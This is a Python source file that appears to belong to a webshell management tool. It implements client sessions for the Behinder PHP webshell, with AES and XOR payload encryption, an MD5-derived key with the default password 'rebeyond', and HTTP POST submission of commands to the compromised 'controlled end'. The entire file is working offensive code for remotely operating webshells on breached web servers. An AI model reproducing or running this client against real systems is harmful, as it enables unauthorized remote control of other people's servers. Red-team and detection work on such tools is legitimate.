import typing as t
import hashlib

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx
import base64

from .. import exceptions

from ..base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)
from ..php import PHPWebshell, php_webshell_conn_options


def md5_encode(s):
    """将给定的字符串或字节序列转换成MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def behinder_aes(payload, key):
    """将给定的payload按照冰蝎的格式进行AES加密"""
    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    payload = "1|" + payload
    payload_padded = pad(payload.encode(), AES.block_size)
    return base64_encode(cipher.encrypt(payload_padded))


def behinder_xor(payload: str, key: bytes):
    """将给定的payload按照冰蝎的格式进行Xor加密"""
    payload_bytes = ("1|" + payload).encode()
    payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
    return base64_encode(payload_xor)


@register_session
class PHPWebshellBehinderAES(PHPWebshell):
    session_type = "BEHINDER_PHP_AES"
    readable_name = "冰蝎AES"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": php_webshell_conn_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(
            session_conn
        )
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.client = get_http_client()

    async def submit_raw(self, payload):
        data = behinder_aes(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc


@register_session
class PHPWebshellBehinderXor(PHPWebshell):
    session_type = "BEHINDER_PHP_XOR"
    readable_name = "冰蝎XOR"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": php_webshell_conn_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(
            session_conn
        )
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.client = get_http_client()

    async def submit_raw(self, payload):
        data = behinder_xor(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
